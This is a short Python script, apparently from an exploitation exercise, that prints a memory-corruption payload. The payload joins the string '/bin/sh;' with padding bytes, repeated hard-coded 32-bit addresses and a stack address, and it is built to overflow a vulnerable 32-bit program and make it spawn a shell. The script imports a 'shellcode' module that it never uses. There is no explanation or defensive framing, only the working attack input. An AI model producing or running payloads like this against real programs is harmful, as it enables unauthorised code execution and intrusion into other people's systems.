#!/usr/bin/python

from shellcode import shellcode
print ("/bin/sh"+"\x3b"+"A"*10+"\x70\xef\x04\x08"+"\x70\xef\x04\x08"+"A"*4+"\x06\xb6\xfe\xbf")
